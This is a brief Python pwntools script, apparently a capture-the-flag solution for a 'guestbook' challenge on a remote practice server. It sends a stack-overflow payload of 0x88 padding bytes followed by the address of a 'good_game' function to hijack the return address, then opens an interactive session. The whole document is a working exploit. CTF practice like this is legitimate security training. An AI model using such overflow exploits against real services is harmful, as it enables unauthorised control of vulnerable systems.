from pwn import *

#p = process('./guestbook')
p = remote('node4.buuoj.cn', 29762)
elf = ELF('guestbook')

#gdb.attach(p, 'b *0x400525')

good_game = elf.sym['good_game']

payload = b'a' * ( 0x88 ) + p64(good_game)

p.sendlineafter('\n', payload)

p.interactive()
